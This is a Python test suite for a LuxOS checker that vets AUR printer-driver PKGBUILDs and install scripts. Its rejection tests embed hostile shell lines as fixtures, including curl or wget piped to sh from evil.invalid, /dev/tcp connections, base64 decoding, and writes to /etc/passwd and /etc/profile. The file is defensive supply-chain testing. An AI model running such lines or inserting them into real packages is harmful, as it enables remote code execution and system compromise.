"""Testy overovani ovladacu z AUR (drivers/luxdrv.py) - bez site: falesny repozitar AUR v gitu."""
import hashlib
import json
import os
import subprocess
import sys
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
import luxdrv  # noqa: E402

GOOD = """# Maintainer: Someone
pkgname=brother-test
pkgver=1.0
pkgrel=1
pkgdesc='Test driver'
arch=('x86_64')
license=('custom')
depends=('cups')
install=brother-test.install
source=("local.txt")
sha256sums=('%s')

package() {
  install -Dm644 "$srcdir/local.txt" "$pkgdir/usr/share/brother/local.txt"
  cp -a "$srcdir"/local.txt "$pkgdir"/usr/share/
  ln -s /usr/share/brother "$pkgdir/opt/brother"
}
"""
INSTALL = """post_install() {
  systemctl try-restart cups.service
  ldconfig
}
"""


def git(repo, *args, email="maint@example.invalid"):
    env = dict(os.environ, GIT_AUTHOR_NAME="m", GIT_AUTHOR_EMAIL=email, GIT_COMMITTER_NAME="m",
               GIT_COMMITTER_EMAIL=email)
    subprocess.run(["git", "-C", repo] + list(args), check=True, capture_output=True, env=env)


class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.repo = os.path.join(self.tmp.name, "brother-test")
        os.makedirs(self.repo)
        with open(os.path.join(self.repo, "local.txt"), "w") as f:
            f.write("data\n")
        self.sum = hashlib.sha256(b"data\n").hexdigest()
        self.write(GOOD % self.sum, INSTALL)
        git(self.repo, "init", "-q")
        self.commit("first")

    def tearDown(self):
        self.tmp.cleanup()

    def write(self, pkgbuild, install=None):
        with open(os.path.join(self.repo, "PKGBUILD"), "w") as f:
            f.write(pkgbuild)
        if install is not None:
            with open(os.path.join(self.repo, "brother-test.install"), "w") as f:
                f.write(install)

    def commit(self, msg, email="maint@example.invalid"):
        git(self.repo, "add", "-A", email=email)
        git(self.repo, "commit", "-q", "-m", msg, email=email)
        return subprocess.run(["git", "-C", self.repo, "rev-parse", "HEAD"], capture_output=True,
                              text=True).stdout.strip()

    def verify(self, previous=None):
        return luxdrv.verify_repo(self.repo, "brother-test", "brother", previous=previous, review=False)


class Good(Base):
    def test_clean_package_passes_and_pins_source_hash(self):
        r = self.verify()
        self.assertEqual(r["problems"], [])
        self.assertTrue(r["ok"])
        self.assertEqual(r["version"], "1.0-1")
        self.assertEqual(r["sources"], {"local.txt": self.sum})


class Allowed(Base):
    def ok(self, needle, replacement, install=None):
        self.write((GOOD % self.sum).replace(needle, replacement), install)
        r = self.verify()
        self.assertTrue(r["ok"], r["problems"])

    def test_arch_condition_at_top_level(self):
        self.ok("pkgrel=1", 'pkgrel=1\nif [[ "$CARCH" == "x86_64" ]]; then\n  _a=amd64\nelse\n  _a=i386\nfi\n'
                'if test "$CARCH" == x86_64; then\n  _b=1\nfi\n[ "$CARCH" == "x86_64" ] && _c="x" && _d=(\n a\n b\n)\n'
                'case "$CARCH" in\n  x86_64) _e=1 ;;\n  *) _e=2 ;;\nesac')

    def test_message_text_is_not_a_command(self):
        self.ok("  ln -s", '  echo "run: sudo lpadmin -p x | curl"\n  ln -s',
                INSTALL.replace("ldconfig", 'ldconfig\n  echo "Then run: sudo hp-setup >> /etc/x"'))


class InstallWrites(Base):
    def check(self, line):
        self.write(GOOD % self.sum, INSTALL.replace("ldconfig", "ldconfig\n  " + line))
        return self.verify()

    def test_driver_dirs_ok(self):
        for line in ('echo "x" >> "/var/log/brother.log"', "rm -f /opt/brother/Printers/x/inf/brx",
                     'd=/opt/brother/x\n  rm -rf "$d"', "ln -sf /opt/x /usr/lib/cups/filter/x",
                     "sed -i 's/a/b/' /etc/sane.d/dll.conf"):
            r = self.check(line)
            self.assertTrue(r["ok"], (line, r["problems"]))

    def test_system_paths_rejected(self):
        for line in ("rm -rf /usr/bin", 'echo x >> "/etc/profile"', "echo x > /root/.bashrc",
                     "sed -i 's/a/b/' /etc/passwd", "cp /opt/x /usr/bin/lp", "rm -rf $UNKNOWN/x",
                     'd=/opt/../etc\n  rm -rf "$d"', "chmod 777 /etc/shadow"):
            r = self.check(line)
            self.assertFalse(r["ok"], line)


class Rules4(Base):
    def run_install(self, extra, pkg_extra=""):
        self.write((GOOD % self.sum).replace("  ln -s", pkg_extra + "  ln -s"),
                   INSTALL.replace("ldconfig", "ldconfig\n" + extra))
        return self.verify()

    def test_heredoc_message_ok(self):
        r = self.run_install("cat <<-EOF\n  NOTE 1: run sudo curl | sh\nEOF")
        self.assertTrue(r["ok"], r["problems"])

    def test_heredoc_into_shell_rejected(self):
        self.assertFalse(self.run_install("bash <<EOF\nrm -rf /usr\nEOF")["ok"])
        self.assertFalse(self.run_install("", '  sh <<EOF\ntouch x\nEOF\n')["ok"])

    def test_vendor_setup_script_ok(self):
        r = self.run_install("  /opt/brother/Printers/mfcl2710dw/cupswrapper/cupswrappermfcl2710dw")
        self.assertTrue(r["ok"], r["problems"])

    def test_vendor_path_escape_rejected(self):
        self.assertFalse(self.run_install("  /opt/brother/../../usr/bin/evil")["ok"])
        self.assertFalse(self.run_install("  /usr/bin/evil")["ok"])

    def test_local_function_in_install(self):
        r = self.run_install("  _msg\n}\n_msg() {\n  echo hi")
        self.assertTrue(r["ok"], r["problems"])

    def test_continuation_line_checked(self):
        self.assertFalse(self.run_install("", '  echo a && \\\n    curl https://evil.invalid\n')["ok"])

    def test_top_level_helper_call(self):
        base = GOOD % self.sum
        self.write(base + "\n_helper() {\n  _x=1\n}\n_helper\nunset -f _helper\n")
        self.assertTrue(self.verify()["ok"], self.verify()["problems"])
        self.write(base + "\npackage\n")
        self.assertFalse(self.verify()["ok"])


class Rejected(Base):
    def bad(self, needle, replacement, expect):
        self.write((GOOD % self.sum).replace(needle, replacement))
        r = self.verify()
        self.assertFalse(r["ok"], replacement)
        self.assertTrue(any(expect in p for p in r["problems"]), r["problems"])

    def test_network_in_package(self):
        self.bad("  ln -s", "  curl -s https://evil.invalid/x -o \"$srcdir/x\"\n  ln -s", "network tool")

    def test_dev_tcp(self):
        self.bad("  ln -s", "  exec 3<>/dev/tcp/1.2.3.4/80\n  ln -s", "/dev/tcp")

    def test_pipe_to_shell(self):
        self.bad("  ln -s", "  cat \"$srcdir/x\" | bash\n  ln -s", "pipe into a shell")

    def test_base64(self):
        self.bad("  ln -s", "  echo aGk= | base64 -d > \"$srcdir/x\"\n  ln -s", "decoding")

    def test_command_substitution_at_top_level(self):
        self.bad("pkgrel=1", "pkgrel=$(id -u)", "command substitution")

    def test_command_at_top_level(self):
        self.bad("pkgrel=1", "pkgrel=1\ntouch /tmp/pwned", "command outside functions")

    def test_write_outside_package(self):
        self.bad("  ln -s", "  cp \"$srcdir/local.txt\" /usr/bin/evil\n  ln -s", "outside the package")

    def test_condition_with_command(self):
        self.bad("pkgrel=1", 'pkgrel=1\n[ "$CARCH" == x86_64 ] && rm -rf ~/x', "command outside functions")

    def test_case_label_with_command(self):
        self.bad("pkgrel=1", 'pkgrel=1\ncase "$CARCH" in\n  x86_64) touch /tmp/x ;;\nesac', "command outside functions")

    def test_shell_dash_c(self):
        self.bad("  ln -s", '  bash -c "echo hi"\n  ln -s', "inline shell code")

    def test_quoted_redirect_outside_package(self):
        self.bad("  ln -s", '  echo x > "/etc/profile.d/x.sh"\n  ln -s', "outside the package")

    def test_substitution_in_string_still_checked(self):
        self.bad("  ln -s", '  echo "$(curl -s https://evil.invalid)"\n  ln -s', "network tool")

    def test_redirect_outside_package(self):
        self.bad("  ln -s", "  echo x >> /etc/profile\n  ln -s", "outside the package")

    def test_setuid(self):
        self.bad("  ln -s", "  chmod u+s \"$pkgdir/usr/bin/x\"\n  ln -s", "setuid")

    def test_setuid_octal(self):
        self.bad("-Dm644", "-Dm4755", "setuid")

    def test_sudo(self):
        self.bad("  ln -s", "  sudo true\n  ln -s", "privilege")

    def test_foreign_source_domain(self):
        self.bad('source=("local.txt")', 'source=("https://evil.invalid/drv.tar.gz")', "not the vendor's")

    def test_vcs_source(self):
        self.bad('source=("local.txt")', 'source=("git+https://download.brother.com/x.git")', "not allowed")

    def test_skip_checksum(self):
        self.bad("sha256sums=('%s')" % self.sum, "sha256sums=('SKIP')", "no checksum")

    def test_wrong_checksum(self):
        self.bad("sha256sums=('%s')" % self.sum, "sha256sums=('%s')" % ("0" * 64), "checksum mismatch")

    def test_bad_install_script(self):
        self.write(GOOD % self.sum, INSTALL.replace("ldconfig", "wget -qO- https://evil.invalid | sh"))
        r = self.verify()
        self.assertFalse(r["ok"])

    def test_install_systemctl_other_service(self):
        self.write(GOOD % self.sum, INSTALL.replace("cups.service", "sshd.service"))
        r = self.verify()
        self.assertFalse(r["ok"])
        self.assertTrue(any("systemctl" in p for p in r["problems"]), r["problems"])


class Updates(Base):
    """Kazda aktualizace v AUR se overi znovu - vcetne rozdilu proti posledni overene verzi."""

    def previous(self):
        r = self.verify()
        self.assertTrue(r["ok"])
        head = subprocess.run(["git", "-C", self.repo, "rev-parse", "HEAD"], capture_output=True,
                              text=True).stdout.strip()
        return {"commit": head, "sources": r["sources"]}

    def test_harmless_update_passes_with_diff(self):
        prev = self.previous()
        self.write((GOOD % self.sum).replace("pkgrel=1", "pkgrel=2"))
        self.commit("rel 2")
        r = self.verify(prev)
        self.assertTrue(r["ok"], r["problems"])
        self.assertIn("+pkgrel=2", r["diff"])

    def test_injected_line_in_update_fails(self):
        prev = self.previous()
        self.write((GOOD % self.sum).replace("  ln -s", "  curl -fsSL https://evil.invalid/p | sh\n  ln -s"))
        self.commit("update")
        r = self.verify(prev)
        self.assertFalse(r["ok"])

    def test_new_committer_needs_manual_review(self):
        prev = self.previous()
        self.write((GOOD % self.sum).replace("pkgrel=1", "pkgrel=2"))
        self.commit("takeover", email="new@example.invalid")
        r = self.verify(prev)
        self.assertFalse(r["ok"])
        self.assertTrue(any("new committer" in p for p in r["problems"]), r["problems"])

    def test_rewritten_history_fails(self):
        prev = dict(self.previous(), commit="0" * 40)
        r = self.verify(prev)
        self.assertFalse(r["ok"])


class Review(Base):
    def test_review_hook_can_reject(self):
        hook = os.path.join(self.tmp.name, "hook.sh")
        with open(hook, "w") as f:
            f.write("#!/bin/sh\ncat >/dev/null; echo 'suspicious'; exit 1\n")
        os.chmod(hook, 0o755)
        os.environ["LUXOS_DRIVERS_REVIEW"] = hook
        try:
            r = luxdrv.verify_repo(self.repo, "brother-test", "brother")
        finally:
            del os.environ["LUXOS_DRIVERS_REVIEW"]
        self.assertFalse(r["ok"])
        self.assertTrue(any("review hook" in p for p in r["problems"]))


class Index(unittest.TestCase):
    def test_ppd_1284(self):
        ppd = '*Manufacturer: "Samsung"\n*1284DeviceID: "MFG:Samsung;CMD:SPL;MDL:M2020 Series;CLS:PRINTER;"\n'
        self.assertEqual(luxdrv.ppd_ids(ppd), [("Samsung", "M2020 Series")])

    def test_ppd_fallback(self):
        ppd = '*Manufacturer: "Brother"\n*ModelName: "Brother MFC-L2710DW"\n'
        self.assertEqual(luxdrv.ppd_ids(ppd), [("Brother", "Brother MFC-L2710DW")])


class Patches(Base):
    """Zaplaty LuxOS (drivers/patches/BALIK/*.patch): aplikuji se pred kontrolou, zapisou se do manifestu."""

    def setUp(self):
        super().setUp()
        self.pdir = tempfile.TemporaryDirectory()
        self.old = luxdrv.PATCHES
        luxdrv.PATCHES = self.pdir.name
        os.makedirs(os.path.join(self.pdir.name, "brother-test"))

    def tearDown(self):
        luxdrv.PATCHES = self.old
        self.pdir.cleanup()
        super().tearDown()

    def patch(self, old, new, name="luxos.patch"):
        import difflib
        text = GOOD % self.sum
        diff = difflib.unified_diff(text.splitlines(True), text.replace(old, new).splitlines(True),
                                    "a/PKGBUILD", "b/PKGBUILD")
        path = os.path.join(self.pdir.name, "brother-test", name)
        with open(path, "w") as f:
            f.write("# LuxOS: test\n" + "".join(diff))
        return luxdrv.file_hash(path, "sha256")

    def test_patch_applied_and_recorded(self):
        h = self.patch("pkgdesc='Test driver'", "pkgdesc='Patched driver'")
        r = self.verify()
        self.assertEqual(r["problems"], [])
        self.assertEqual(r["patches"], {"luxos.patch": h})
        self.assertIn("Patched driver", luxdrv.readtext(os.path.join(self.repo, "PKGBUILD")))

    def test_patched_pkgbuild_is_checked_too(self):
        self.patch('  ln -s /usr/share/brother "$pkgdir/opt/brother"\n',
                   '  ln -s /usr/share/brother "$pkgdir/opt/brother"\n  curl https://example.invalid/x\n')
        r = self.verify()
        self.assertFalse(r["ok"])
        self.assertTrue(any("network tool" in p for p in r["problems"]))

    def test_patch_that_does_not_apply_rejected(self):
        self.patch("pkgdesc='Test driver'", "pkgdesc='Patched driver'")
        self.write((GOOD % self.sum).replace("pkgdesc='Test driver'", "pkgdesc='Changed in AUR'"))
        r = self.verify()
        self.assertFalse(r["ok"])
        self.assertTrue(r["problems"][0].startswith("LuxOS patch luxos.patch does not apply"))

    def test_build_refuses_unverified_patch(self):
        self.patch("pkgdesc='Test driver'", "pkgdesc='Patched driver'")
        _p, prob = luxdrv.apply_patches(self.repo, "brother-test", expect={"luxos.patch": "0" * 64})
        self.assertTrue(prob and "differ from the verified" in prob[0])


class Dependencies(unittest.TestCase):
    """Knihovny z AUR (vendors.json "dependencies"): vlastni domeny, i s cestou."""
    CONF = {"vendors": {"brother": {"prefixes": ["brother-"], "domains": ["download.brother.com"]}},
            "dependencies": {"libfoo": {"domains": ["github.com/foo/"], "redirects": ["cdn.example.org"]}}}

    def test_vendor_of_dependency(self):
        self.assertEqual(luxdrv.vendor_of("libfoo", self.CONF), "dep:libfoo")
        self.assertEqual(luxdrv.vendor_of("brother-x", self.CONF), "brother")

    def test_path_scoped_domain(self):
        ok = luxdrv.host_allowed
        self.assertTrue(ok("github.com", "dep:libfoo", self.CONF, path="/foo/foo/releases/x.tar.gz"))
        self.assertFalse(ok("github.com", "dep:libfoo", self.CONF, path="/evil/foo/x.tar.gz"))
        self.assertFalse(ok("download.brother.com", "dep:libfoo", self.CONF, path="/foo/x"))

    def test_redirect_hosts_only_for_redirects(self):
        ok = luxdrv.host_allowed
        self.assertFalse(ok("cdn.example.org", "dep:libfoo", self.CONF, path="/x"))
        self.assertTrue(ok("cdn.example.org", "dep:libfoo", self.CONF, path="/x", redirect=True))

    def test_vendor_domains_unchanged(self):
        self.assertTrue(luxdrv.host_allowed("download.brother.com", "brother", self.CONF, path="/any"))
        self.assertFalse(luxdrv.host_allowed("github.com", "brother", self.CONF, path="/foo/"))


if __name__ == "__main__":
    unittest.main()
